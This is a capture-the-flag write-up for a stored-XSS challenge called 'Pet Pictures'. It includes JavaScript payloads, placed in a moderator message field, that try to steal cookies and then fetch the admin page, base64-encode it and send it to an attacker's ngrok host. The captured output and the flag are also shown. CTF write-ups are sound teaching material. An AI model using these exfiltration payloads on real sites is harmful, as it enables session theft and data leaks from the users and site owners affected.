# Pet Pictures

Points: 150

Completed after the CTF ended using the write-up by WCSC, which this write-up
is basically a copy-paste of. This is an XSS problem.

Start by opening a `ngrok` instance.
```bash
ngrok http 80
```

First attempt (the payload needs to go in the `Message to the Moderator` input):
```html
<script>
document.write('<img src="http://8e6c293f1b3b.ngrok.io/collect.gif?cookie=' + document.cookie + '" />')
</script>
```

We use `idiot.png` to pretend that the URL is loading an image. We then grab
the moderator's cookies and send it to our `ngrok` instance. However, the
cookie is not present. This is because the cookie is set to HttpOnly, which
makes it impossible to retrieve using JavaScript.

Instead of logging in as moderator, maybe we can make them do what we need by
proxy. Clicking the moderator button shows
http://pwn.osucyber.club:13378/login?next=%2Fadmin. The [next
parameter](https://stackoverflow.com/q/10695629/6759699) implies that there's
an admin page: http://pwn.osucyber.club:13378/admin.

Instead of making the moderator send its auth cookies, we can just dump the
entire contents of the `admin` HTML page and send it our `ngrok` instance:
```html
<script>
    var req = new XMLHttpRequest();
    req.open('GET', 'http://pwn.osucyber.club:13378/admin', false);
    req.send(null);
    console.log("HERE!");
    url = "http://8e6c293f1b3b.ngrok.io/idiot.png?cookie=";
    result = req.responseText;
    url = url.concat(window.btoa(result)); // Append Base64 encoded page contents
    document.write("<img src='" + url + "'></img>");
</script>
```

We can then receive this value in the `ngrok` web interface.

```
PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuLVVTIj4KICA8aGVhZD4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvbWF0ZXJpYWxpemUvMS4wLjAvY3NzL21hdGVyaWFsaXplLm1pbi5jc3MiPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL21hdGVyaWFsaXplLzEuMC4wL2pzL21hdGVyaWFsaXplLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2ljb24/ZmFtaWx5PU1hdGVyaWFsK0ljb25zIiByZWw9InN0eWxlc2hlZXQiPgoKICAgIAogICAgPHRpdGxlPkFkbWluPC90aXRsZT4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICA8ZGl2IGNsYXNzPSJuYXZiYXItZml4ZWQiPgogICAgPG5hdj4KICAgICAgPGRpdiBjbGFzcz0ibmF2LXdyYXBwZXIiPgogICAgICAgIDxhIGhyZWY9Ii8iIGNsYXNzPSJicmFuZC1sb2dvIGNlbnRlciI+PGkgY2xhc3M9Im1hdGVyaWFsLWljb25zIj5wZXRzPC9pPlBldFBpY3R1cmVzPC9hPgogICAgICAgIDx1bCBjbGFzcz0icmlnaHQiPgogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9zdWJtaXQiPlN1Ym1pdDwvYT48L2xpPgogICAgICAgICAgCiAgICAgICAgICA8bGk+PGEgaHJlZj0iL2xvZ291dCI+TG9nb3V0PC9hPjwvbGk+CiAgICAgICAgICAKICAgICAgICA8L3VsPgogICAgICA8L2Rpdj4KICAgIDwvbmF2PgogICAgCiAgICAgIAogICAgCiAgPC9kaXY+CgogIAo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgCiAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbCBzMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLXBhbmVsIGdyZXkgbGlnaHRlbi0yIj4KICAgICAgICAgICAgICAgIDxzcGFuPlBlbmRpbmcgQXBwcm92YWw6IDE8L3NwYW4+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICAKICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBob3Jpem9udGFsIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1pbWFnZSI+CiAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3VwbG9hZC8yZjRkZDEyZjgwZTY4OTFkY2M3Mzc2ZDVkMjlmM2FiOGRiYjg2NWUyIiBhbHQ9ImNseWRlIi8+CiAgICAgICAgICAgICAgICA8YSBjbGFzcz0iY2FyZC10aXRsZSI+Q2x5ZGU8L2E+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgPHA+TW9kZXJhdG9yIE1lc3NhZ2U6IG9zdWN0ZntuM1YzUl83UnU1VF91czNyXzFOUFU3fTwvcD4KICAgICAgICAgICAgICAgIDxwPlN1Ym1pdHRlZCBCeTogV2F0c29uPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgCjwvZGl2PgoKICA8L2JvZHk+CjwvaHRtbD4=
```

Which decodes to:


```html
<!doctype html>
<html lang="en-US">
  <head>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">


    <title>Admin</title>

  </head>
  <body>
  <div class="navbar-fixed">
    <nav>
      <div class="nav-wrapper">
        <a href="/" class="brand-logo center"><i class="material-icons">pets</i>PetPictures</a>
        <ul class="right">
          <li><a href="/submit">Submit</a></li>

          <li><a href="/logout">Logout</a></li>

        </ul>
      </div>
    </nav>



  </div>


<div class="container">

    <div class="row">
        <div class="col s12">
            <div class="card-panel grey lighten-2">
                <span>Pending Approval: 1</span>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="card horizontal">
            <div class="card-image">
                <img src="/upload/2f4dd12f80e6891dcc7376d5d29f3ab8dbb865e2" alt="clyde"/>
                <a class="card-title">Clyde</a>
            </div>
            <div class="card-content">
                <p>Moderator Message: osuctf{n3V3R_7Ru5T_us3r_1NPU7}</p>
                <p>Submitted By: Watson</p>
            </div>
        </div>
    </div>

</div>

  </body>
</html>
```

Thus we can see that the flag is `osuctf{n3V3R_7Ru5T_us3r_1NPU7}`
